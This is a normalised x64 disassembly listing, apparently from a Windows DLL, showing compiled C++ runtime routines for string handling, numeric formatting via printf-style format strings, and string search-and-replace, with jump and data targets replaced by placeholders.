mov rbx [ rbp - 0x69 ]
sub rdi rcx
mov rdx r15
sub rdx rdi
inc rdx
lea rbx [ r13 + rdi ]
lea rcx [ r13 + rdi + 0x1 ]
mov r9 rdx
mov r8 rbx
call sub_1800216d0
mov [ rbx ] 0x0
inc r15
lea rax [ r12 + 0x1 ]
cmp [ rax ] 0x0
cmovg r12 rax
movzx eax [ r12 ]
cmp al 0x7f
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
movups [ r12 ] xmm0
xor edi edi
jmp r-xdata
mov rbx [ rsp + 0x38 ]
nop
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
mov rcx [ rbp - 0x41 ]
mov rax [ rcx ]
call [ rax + 0x10 ]
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] r15
mov r9 r13
lea r8 [ rsp + 0x30 ]
lea rdx [ rbp - 0x41 ]
mov rcx [ rbp - 0x59 ]
call sub_18000d2a0
mov r11 rax
mov rax [ rax ]
mov [ r12 ] rax
mov rax [ r11 + 0x8 ]
mov [ r12 + 0x8 ] rax
mov rax [ rbp - 0x61 ]
mov [ rax + 0x28 ] 0x0
movups xmm0 [ r12 ]
movaps [ rsp + 0x30 ] xmm0
test rdi rdi
je r-xdata
mov [ rbp - 0x71 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
mov [ rsp + 0x30 ] 0x1
mov rax [ rbx + 0x48 ]
cmp [ rax ] 0x0
je r-xdata
movzx r8d [ r12 ]
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx r8b
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rbp - 0x71 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
cmp eax 0xffffffff
jne r-xdata
test rbx rbx
je r-xdata
movaps xmm0 [ rsp + 0x30 ]
movzx edx sil
mov rax [ rbx ]
mov rcx rbx
call [ rax + 0x18 ]
mov rax [ rbx + 0x60 ]
cmp [ rax ] 0x0
jle r-xdata
inc r12
dec r13
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] r8b
movzx eax r8b
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
dec rdi
jne r-xdata
dec [ rax ]
mov rcx [ rbx + 0x48 ]
mov rdx [ rcx ]
lea rax [ rdx + 0x1 ]
mov [ rcx ] rax
mov [ rdx ] sil
movzx eax sil
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
sub_18000f740
mov [ rsp + 0x8 ] rcx
push rbp
push rsi
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rsi r8
mov rbp rdx
mov rbx rcx
xor eax eax
mov [ rsp + 0x58 ] eax
mov [ rcx + 0x18 ] 0xf
mov [ rcx + 0x10 ] rax
mov [ rcx ] al
mov [ rsp + 0x58 ] 0x1
mov rdx [ rdx + 0x10 ]
add rdx [ r8 + 0x10 ]
mov rdi [ rcx + 0x10 ]
cmp rdi rdx
ja r-xdata
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rbp
mov rcx rbx
call sub_180007b00
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rsi
mov rcx rbx
call sub_180007b00
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x30
pop rdi
pop rsi
pop rbp
retn
cmp [ rcx + 0x18 ] rdx
je r-xdata
mov r8b 0x1
call sub_1800078a0
test al al
je r-xdata
mov [ rbx + 0x10 ] rdi
cmp [ rbx + 0x18 ] 0x10
jb r-xdata
mov rax rbx
mov rax [ rbx ]
jmp r-xdata
mov [ rax + rdi ] 0x0
sub_18000f7f0
push rbx
sub rsp 0x20
mov rax r8
mov r10 rdx
mov rbx rcx
or r9 0xffffffffffffffff
xor r8d r8d
mov rdx rax
mov rcx r10
mov [ rsp + 0x30 ] 0x0
call sub_180007b00
mov [ rbx + 0x18 ] 0xf
mov [ rbx + 0x10 ] 0x0
mov rcx rbx
mov rdx rax
mov [ rbx ] 0x0
call sub_1800083f0
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000f840
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov rsi rcx
mov ecx 0x10
mov edi r8d
mov r12 rdx
call sub_180021000
mov rbx rax
test rax rax
je r-xdata
xor ebx ebx
mov [ rax ] 0x0
mov [ rax + 0x8 ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
mov r8 rdi
mov rdx r12
mov rcx rax
call sub_1800205e0
mov [ rbx + 0x8 ] edi
mov rbp [ rsi + 0x58 ]
mov r8 [ rbp + 0x8 ]
lea r9 [ rsp + 0x58 ]
lea rcx [ rsi + 0x58 ]
mov rdx rbp
call sub_18000d860
mov rcx 0x1ffffffffffffffe
mov r11 rax
mov rax [ rsi + 0x60 ]
sub rcx rax
cmp rcx 0x1
jae r-xdata
mov edx 0x1
mov rcx rdi
mov [ rsp + 0x58 ] rbx
call sub_180021308
mov [ rbx ] rax
cmp rax 0x0
je r-xdata
inc rax
mov [ rsi + 0x60 ] rax
mov [ rbp + 0x8 ] r11
mov rax [ r11 + 0x8 ]
mov [ rax ] r11
add [ rsi + 0x38 ] edi
lea rcx [ r--data ]
call sub_18001f6b8
sub_18000f950
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rdi rdx
mov rbx r9
mov rsi rcx
mov [ rsp + 0x50 ] 0x25
lea rdx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rdx [ rsp + 0x52 ]
mov ecx eax
mov [ rdx ] 0x6c
and ecx 0xe00
cmp ecx 0x400
jne r-xdata
mov [ rdx ] 0x23
inc rdx
cmp ecx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x64
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rdx + 0x1 ] al
mov [ rdx + 0x2 ] 0x0
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
call sub_1800217c4
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rcx eax
lea rax [ rsp + 0x60 ]
mov rdx rdi
mov [ rsp + 0x30 ] rcx
movzx ecx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] cl
mov rcx rsi
call sub_18000f310
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_18000fa50
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov eax [ r9 + 0x18 ]
mov rdi rdx
mov rbx r9
mov rsi rcx
mov [ rsp + 0x50 ] 0x25
lea rdx [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test al 0x20
je r-xdata
test al 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rdx [ rsp + 0x52 ]
mov ecx eax
mov [ rdx ] 0x6c
and ecx 0xe00
cmp ecx 0x400
jne r-xdata
mov [ rdx ] 0x23
inc rdx
cmp ecx 0x800
je r-xdata
mov al 0x6f
jmp r-xdata
shl al 0x3
not al
and al 0x20
or al 0x58
mov al 0x75
jmp r-xdata
mov r9d [ rsp + 0xf8 ]
mov [ rdx + 0x1 ] al
mov [ rdx + 0x2 ] 0x0
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
call sub_1800217c4
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rcx eax
lea rax [ rsp + 0x60 ]
mov rdx rdi
mov [ rsp + 0x30 ] rcx
movzx ecx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] cl
mov rcx rsi
call sub_18000f310
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_18000fb50
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rdi rdx
mov edx [ r9 + 0x18 ]
mov rbx r9
mov rsi rcx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov ecx edx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and ecx 0xe00
cmp ecx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp ecx 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl 0x64
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] dl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_1800217c4
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rcx eax
lea rax [ rsp + 0x60 ]
mov rdx rdi
mov [ rsp + 0x30 ] rcx
movzx ecx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] cl
mov rcx rsi
call sub_18000f310
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_18000fc50
push rbx
push rsi
push rdi
sub rsp 0xb0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xa0 ] rax
movups xmm0 [ r8 ]
mov rdi rdx
mov edx [ r9 + 0x18 ]
mov rbx r9
mov rsi rcx
mov [ rsp + 0x50 ] 0x25
lea rax [ rsp + 0x51 ]
movaps [ rsp + 0x40 ] xmm0
test dl 0x20
je r-xdata
test dl 0x8
je r-xdata
mov [ rsp + 0x51 ] 0x2b
lea rax [ rsp + 0x52 ]
mov ecx edx
mov [ rax ] 0x3649
mov [ rax + 0x2 ] 0x34
and ecx 0xe00
cmp ecx 0x400
jne r-xdata
mov [ rax ] 0x23
inc rax
cmp ecx 0x800
je r-xdata
mov dl 0x6f
jmp r-xdata
shl dl 0x3
not dl
and dl 0x20
or dl 0x58
mov dl 0x75
jmp r-xdata
mov r9 [ rsp + 0xf8 ]
mov [ rax + 0x3 ] dl
lea r8 [ rsp + 0x50 ]
lea rcx [ rsp + 0x60 ]
mov edx 0x40
mov [ rax + 0x4 ] 0x0
call sub_1800217c4
lea r8 [ rsp + 0x40 ]
mov r9 rbx
movsxd rcx eax
lea rax [ rsp + 0x60 ]
mov rdx rdi
mov [ rsp + 0x30 ] rcx
movzx ecx [ rsp + 0xf0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] cl
mov rcx rsi
call sub_18000f310
mov rax rdi
mov rcx [ rsp + 0xa0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xb0
pop rdi
pop rsi
pop rbx
retn
sub_18000fd50
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
movapd xmm0 xmm1
mulsd xmm0 [ r--data ]
ucomisd xmm0 xmm1
jpe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
je r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
comisd xmm1 xmm3
jbe r-xdata
cmp rsi 0x1388
jae r-xdata
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x2 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x3 ] 0x0
call sub_1800217c4
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dl
mov rdx r12
call sub_18000e900
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_18000ff60
push rbx
push rbp
push rsi
push rdi
push r12
push r13
sub rsp 0xf8
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0xe0 ] rax
mov rbx [ r9 + 0x20 ]
mov rbp r9
mov r12 rdx
mov r13 rcx
test rbx rbx
jg r-xdata
mov edx [ rbp + 0x18 ]
movsd xmm1 [ rsp + 0x158 ]
mov eax 0x24
cmp rbx rax
mov r9d ebx
cmovg r9d eax
xor esi esi
movsxd rax r9d
mov edi esi
sub rbx rax
mov eax edx
and eax 0x3000
cmp eax 0x2000
jne r-xdata
test [ r9 + 0x18 ] 0x2000
jne r-xdata
movups xmm0 [ r8 ]
mov [ rsp + 0x60 ] 0x25
lea rax [ rsp + 0x61 ]
movaps [ rsp + 0x50 ] xmm0
test dl 0x20
je r-xdata
xorpd xmm3 xmm3
movsd xmm4 [ r--data ]
comisd xmm3 xmm1
jbe r-xdata
mov ebx 0x6
test dl 0x10
je r-xdata
mov [ rsp + 0x61 ] 0x2b
lea rax [ rsp + 0x62 ]
xor al al
mov al 0x1
xorpd xmm1 xmm4
jmp r-xdata
and edx 0x3000
mov [ rax ] 0x2a2e
mov [ rax + 0x2 ] 0x4c
cmp edx 0x2000
jne r-xdata
mov [ rax ] 0x23
inc rax
comisd xmm1 xmm3
jbe r-xdata
nop [ rax ] eax
movsd xmm0 [ r--data ]
movsd xmm2 [ r--data ]
comisd xmm1 xmm0
jb r-xdata
cmp edx 0x3000
jne r-xdata
mov cl 0x66
jmp r-xdata
test al al
je r-xdata
cmp rbx 0xa
jl r-xdata
divsd xmm1 xmm2
add rsi 0xa
comisd xmm1 xmm0
jae r-xdata
mov ecx 0x67
mov r8d 0x65
cmp edx 0x1000
cmove ecx r8d
mov cl 0x61
jmp r-xdata
mov [ rax + 0x3 ] cl
lea r8 [ rsp + 0x60 ]
lea rcx [ rsp + 0x70 ]
movsd [ rsp + 0x20 ] xmm1
mov edx 0x6c
mov [ rax + 0x4 ] 0x0
call sub_1800217c4
lea r8 [ rsp + 0x50 ]
mov r9 rbp
movsxd rdx eax
lea rax [ rsp + 0x70 ]
mov rcx r13
mov [ rsp + 0x48 ] rdx
movzx edx [ rsp + 0x150 ]
mov [ rsp + 0x40 ] rbx
mov [ rsp + 0x38 ] rdi
mov [ rsp + 0x30 ] rsi
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] dl
mov rdx r12
call sub_18000e900
mov rax r12
mov rcx [ rsp + 0xe0 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xf8
pop r13
pop r12
pop rdi
pop rsi
pop rbp
pop rbx
retn
xorpd xmm1 xmm4
movsd xmm0 [ r--data ]
nop [ rax + rax ] eax
cmp rsi 0x1388
jae r-xdata
cmp rdi 0x1388
jae r-xdata
sub rbx 0xa
add rdi 0xa
mulsd xmm1 xmm2
cmp rbx 0xa
jge r-xdata
comisd xmm0 xmm1
jb r-xdata
sub_180010160
push rbx
push rsi
push rdi
sub rsp 0xa0
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x90 ] rax
movups xmm0 [ r8 ]
mov rdi r9
mov r9 [ rsp + 0xe8 ]
mov rbx rcx
mov rsi rdx
lea r8 [ r--data ]
lea rcx [ rsp + 0x50 ]
mov edx 0x40
movaps [ rsp + 0x40 ] xmm0
call sub_1800217c4
lea r8 [ rsp + 0x40 ]
mov r9 rdi
movsxd rcx eax
lea rax [ rsp + 0x50 ]
mov rdx rsi
mov [ rsp + 0x30 ] rcx
movzx ecx [ rsp + 0xe0 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] cl
mov rcx rbx
call sub_18000f310
mov rax rsi
mov rcx [ rsp + 0x90 ]
xor rcx rsp
call sub_1800212e0
add rsp 0xa0
pop rdi
pop rsi
pop rbx
retn
sub_180010200
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x37 ]
sub rsp 0xb0
mov [ rbp - 0x31 ] 0xfffffffffffffffe
mov [ rsp + 0xf0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x27 ] rax
mov ebx edx
mov rsi rcx
xor r13d r13d
mov [ rbp - 0x41 ] r13
mov [ rbp - 0x39 ] r13
lea ecx [ r13 + 0x30 ]
call sub_180021000
mov [ rbp - 0x49 ] rax
test rax rax
je r-xdata
mov rdi r13
mov rcx rax
call sub_180017520
mov rdi rax
jmp r-xdata
lea rcx [ rsi + 0x10 ]
mov [ rsp + 0x28 ] ebx
mov [ rsp + 0x20 ] rax
mov r9d 0x28
lea r8 [ rbp - 0x39 ]
lea rdx [ rbp - 0x41 ]
call sub_18000b330
cmp al 0x1
sete bl
cmp [ rbp - 0x11 ] 0x8
jb r-xdata
mov rax [ rax ]
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rdi
call sub_1800175a0
mov r8d 0x16
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp - 0x29 ]
mov rcx rdi
call sub_180017bc0
nop
cmp [ rax + 0x18 ] 0x8
jb r-xdata
test bl bl
je r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18002094c#2
test rdi rdi
je r-xdata
mov r8d 0x22
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp - 0x1 ]
mov rcx rdi
call sub_180017d20
mov rbx rax
lea rdx [ rbp - 0x29 ]
mov rcx rdi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x27 ]
xor rcx rsp
call sub_1800212e0
mov rbx [ rsp + 0xf0 ]
add rsp 0xb0
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rdi
call sub_180017560
mov rcx rdi
call j_sub_18002094c#2
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rsi
call sub_18000f840
nop
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x11 ] 0xf
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] 0x0
cmp [ rbp + 0x17 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18002094c#2
mov [ rbp - 0x49 ] r13
lea r9 [ rbp - 0x49 ]
mov r8 [ rbp - 0x39 ]
mov rdx [ rbp - 0x41 ]
mov rcx rdi
call sub_180017b50
mov r12 rax
mov r8d [ rbp - 0x49 ]
mov rdx rax
mov rcx rsi
call sub_18000f840
mov r8d 0x1e
lea rdx [ rw-data ]
mov rcx rdi
call sub_180017590
lea rdx [ rbp - 0x1 ]
mov rcx rdi
call sub_180017d20
mov rbx rax
lea rdx [ rbp - 0x29 ]
mov rcx rdi
call sub_180017d20
nop
cmp [ rax + 0x18 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
mov r8d [ rbx + 0x10 ]
mov rdx rax
mov rcx rsi
call sub_18000f840
nop
cmp [ rbp - 0x11 ] 0x10
jb r-xdata
mov rax [ rax ]
mov [ rbp - 0x11 ] 0xf
mov [ rbp - 0x19 ] r13
mov [ rbp - 0x29 ] 0x0
cmp [ rbp + 0x17 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x29 ]
call j_sub_18002094c#2
mov rcx [ rbp - 0x41 ]
test rcx rcx
je r-xdata
mov rcx [ rbp - 0x1 ]
call j_sub_18002094c#2
test r12 r12
je r-xdata
call sub_18002094c
mov rcx r12
call sub_18002094c
sub_180010460
push rbp
push rsi
push rdi
push r12
push r13
lea rbp [ rsp - 0x70 ]
sub rsp 0x170
mov [ rsp + 0x68 ] 0xfffffffffffffffe
mov [ rsp + 0x1b0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x60 ] rax
mov rsi rdx
mov r12 rcx
mov r8d [ rdx + 0x8 ]
mov [ rbp - 0x28 ] 0xf
xor r13d r13d
mov [ rbp - 0x30 ] r13
mov [ rbp - 0x40 ] r13b
mov rdx [ rdx ]
lea rcx [ rbp - 0x40 ]
call sub_180008110
nop
lea ecx [ r13 + 0x30 ]
call sub_180021000
mov [ rsp + 0x38 ] rax
test rax rax
je r-xdata
mov rbx r13
mov rcx rax
call sub_180017520
mov rbx rax
jmp r-xdata
cmp [ rbp ] 0x8
jb r-xdata
cmp [ rbp - 0x78 ] 0x8
jb r-xdata
mov r8d 0xb
lea rdx [ rw-data ]
mov rcx rbx
call sub_1800175a0
mov r8d 0x2c
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rsp + 0x70 ]
mov rcx rbx
call sub_180017bc0
nop
lea rdx [ rsp + 0x70 ]
mov rdi [ rsp + 0x70 ]
mov rcx [ rbp - 0x78 ]
cmp rcx 0x8
cmovae rdx rdi
mov rax [ rbp - 0x80 ]
lea r8 [ rdx + rax * 2 ]
lea rdx [ rsp + 0x70 ]
cmovae rdx rdi
mov [ rbp + 0x28 ] 0xf
mov [ rbp + 0x20 ] r13
mov [ rbp + 0x10 ] 0x0
movzx r9d [ rsp + 0x30 ]
lea rcx [ rbp + 0x10 ]
call sub_18000de40
nop
mov r8d 0x30
lea rdx [ rw-data ]
mov rcx rbx
call sub_180017590
lea rdx [ rbp - 0x18 ]
mov rcx rbx
call sub_180017bc0
mov rdi rax
lea rax [ rsp + 0x70 ]
cmp rax rdi
je r-xdata
lea rdx [ rsp + 0x70 ]
mov rdi [ rsp + 0x70 ]
mov rcx [ rbp - 0x78 ]
cmp rcx 0x8
cmovae rdx rdi
mov rax [ rbp - 0x80 ]
lea r8 [ rdx + rax * 2 ]
lea rdx [ rsp + 0x70 ]
cmovae rdx rdi
mov [ rbp + 0x50 ] 0xf
mov [ rbp + 0x48 ] r13
mov [ rbp + 0x38 ] 0x0
movzx r9d [ rsp + 0x30 ]
lea rcx [ rbp + 0x38 ]
call sub_18000de40
nop
test rbx rbx
je r-xdata
mov rcx [ rbp - 0x18 ]
call j_sub_18002094c#2
mov [ rbp - 0x78 ] 0x7
mov [ rbp - 0x80 ] r13
mov [ rsp + 0x70 ] r13w
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rsp + 0x70 ]
call j_sub_18002094c#2
lea rdx [ rbp + 0x10 ]
cmp [ rbp + 0x28 ] 0x10
cmovae rdx [ rbp + 0x10 ]
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r9 [ rcx - 0x1 ]
xor r8d r8d
lea rcx [ rbp - 0x40 ]
call sub_18000c680
mov rbx rax
lea rdx [ rbp + 0x38 ]
cmp [ rbp + 0x50 ] 0x10
cmovae rdx [ rbp + 0x38 ]
xor eax eax
or rcx 0xffffffffffffffff
mov rdi rdx
[ rdi ]
not rcx
lea r9 [ rcx - 0x1 ]
xor r8d r8d
lea rcx [ rbp - 0x40 ]
call sub_18000c680
cmp rbx 0xffffffffffffffff
jne r-xdata
mov rcx rbx
call sub_180017560
mov rcx rbx
call j_sub_18002094c#2
mov rax [ rdi ]
mov [ rsp + 0x70 ] rax
mov [ rdi ] r13
mov r8 [ rdi + 0x10 ]
inc r8
add r8 r8
mov rdx rdi
lea rcx [ rsp + 0x70 ]
call sub_1800205e0
jmp r-xdata
mov rdi r13
cmp rbx 0xffffffffffffffff
cmovne rdi [ rbp + 0x20 ]
cmp rax 0xffffffffffffffff
je r-xdata
cmp rax rbx
jne r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbp - 0x80 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbp - 0x78 ] rax
mov [ rdi + 0x10 ] r13
mov [ rdi + 0x18 ] r13
mov [ rbp - 0x50 ] 0xf
mov [ rbp - 0x58 ] r13
mov [ rbp - 0x68 ] 0x0
mov rax [ rbp - 0x30 ]
sub rax rdi
mov [ rsp + 0x20 ] rax
mov r9 rdi
lea r8 [ rbp - 0x40 ]
xor edx edx
lea rcx [ rbp - 0x68 ]
call sub_180007c20
lea r11 [ rsp + 0x40 ]
mov [ rsp + 0x38 ] r11
mov [ rsp + 0x58 ] 0xf
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x40 ] 0x0
mov r8d 0x4
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_180008110
nop
mov [ rbp ] 0xf
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] 0x0
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180008110
nop
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x18 ]
lea rdx [ rbp - 0x68 ]
mov rcx r12
call sub_18000df80
test al al
jne r-xdata
add rdi [ rbp + 0x48 ]
cmp [ rbp + 0x50 ] 0x10
jb r-xdata
mov rcx [ rbp - 0x58 ]
add rcx rdi
mov edx 0x1
call sub_180021308
mov rbx rax
test rax rax
jne r-xdata
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x38 ] rax
mov [ rsp + 0x58 ] 0xf
mov [ rsp + 0x50 ] r13
mov [ rsp + 0x40 ] 0x0
mov r8d 0x3
lea rdx [ r--data ]
lea rcx [ rsp + 0x40 ]
call sub_180008110
nop
mov [ rbp ] 0xf
mov [ rbp - 0x8 ] r13
mov [ rbp - 0x18 ] 0x0
mov r8d 0x1
lea rdx [ r--data ]
lea rcx [ rbp - 0x18 ]
call sub_180008110
nop
lea r9 [ rsp + 0x40 ]
lea r8 [ rbp - 0x18 ]
lea rdx [ rbp - 0x68 ]
mov rcx r12
call sub_18000df80
test al al
jne r-xdata
cmp [ rbp + 0x28 ] 0x10
jb r-xdata
mov rcx [ rbp + 0x38 ]
call j_sub_18002094c#2
nop
mov rcx [ rsi ]
call sub_18002094c
lea rdx [ rbp - 0x40 ]
cmp [ rbp - 0x28 ] 0x10
cmovae rdx [ rbp - 0x40 ]
mov r8 rdi
mov rcx rbx
call sub_1800205e0
lea rdx [ rbp - 0x68 ]
cmp [ rbp - 0x50 ] 0x10
cmovae rdx [ rbp - 0x68 ]
lea rcx [ rbx + rdi ]
mov r8 [ rbp - 0x58 ]
call sub_1800205e0
mov [ rsi ] rbx
